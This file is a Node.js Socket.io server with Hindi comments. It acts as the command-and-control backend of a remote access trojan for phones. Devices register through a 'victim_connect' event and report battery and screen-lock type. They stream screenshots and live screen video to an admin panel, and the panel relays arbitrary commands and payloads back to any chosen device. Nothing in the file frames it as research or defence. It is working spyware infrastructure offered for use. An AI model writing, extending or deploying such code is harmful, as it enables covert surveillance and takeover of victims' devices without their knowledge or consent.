const express = require('express');
const http = require('http');
const path = require('path');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    pingInterval: 10000,
    pingTimeout: 5000,
    transports: ['websocket', 'polling'],
    cors: { origin: "*" }
});

const PORT = process.env.PORT || 8080;

let devices = {};
const adminSockets = new Set();

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

io.on('connection', (socket) => {
    console.log('A user connected:', socket.id);

    // एडमिन को एक खास सेट में डालें ताकि हम उसे टारगेट कर सकें
    socket.on('admin_join', () => {
        adminSockets.add(socket.id);
        console.log('Admin joined:', socket.id);
        socket.emit('device_list', Object.values(devices));
    });

    // डिवाइस से कमांड भेजने के लिए
    socket.on('command_to_device', (data) => {
        const device = devices[data.deviceId];
        if (device && device.socketId) {
            io.to(device.socketId).emit(data.action, data.payload);
        }
    });

    // जब नया डिवाइस कनेक्ट हो
    socket.on('victim_connect', (deviceInfo) => {
        // अगर डिवाइस पहले से लिस्ट में है, तो सिर्फ socketId अपडेट करें
        devices[deviceInfo.deviceId] = { ...devices[deviceInfo.deviceId], ...deviceInfo, socketId: socket.id };
        console.log('Device connected:', deviceInfo.deviceName);
        // केवल सभी एडमिन को बताएं
        adminSockets.forEach(adminId => {
            io.to(adminId).emit('new_device_joined', devices[deviceInfo.deviceId]);
        });
    });

    // ✅✅✅ सबसे बड़ा फिक्स: यह डेटा केवल एडमिन को भेजें ✅✅✅
    socket.on('screen_data', (data) => {
        adminSockets.forEach(adminId => {
            io.to(adminId).emit('screen_update', data);
        });
    });
    
    socket.on('live_screen', (data) => {
        adminSockets.forEach(adminId => {
            io.to(adminId).emit('live_screen', data);
        });
    });

    // डिवाइस से हार्टबीट आने पर
    socket.on('heartbeat', (data) => {
        if (data && data.deviceId && devices[data.deviceId]) {
            devices[data.deviceId].battery = data.battery;
            devices[data.deviceId].lockType = data.lockType || "none";
            devices[data.deviceId].lastSeen = new Date().toISOString();
            // हार्टबीート की जानकारी भी एडमिन को भेजें
            adminSockets.forEach(adminId => {
                io.to(adminId).emit('device_heartbeat', data);
            });
        }
    });

    // जब कोई डिस्कनेक्ट हो
    socket.on('disconnect', () => {
        if (adminSockets.has(socket.id)) {
            adminSockets.delete(socket.id);
            console.log('Admin disconnected:', socket.id);
        } else {
            let disconnectedDeviceId = null;
            for (const deviceId in devices) {
                if (devices[deviceId].socketId === socket.id) {
                    disconnectedDeviceId = deviceId;
                    break;
                }
            }
            if (disconnectedDeviceId) {
                console.log('Device disconnected:', devices[disconnectedDeviceId].deviceName);
                delete devices[disconnectedDeviceId];
                // केवल एडमिन को बताएं
                adminSockets.forEach(adminId => {
                    io.to(adminId).emit('device_disconnected', disconnectedDeviceId);
                });
            }
        }
    });
});

server.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
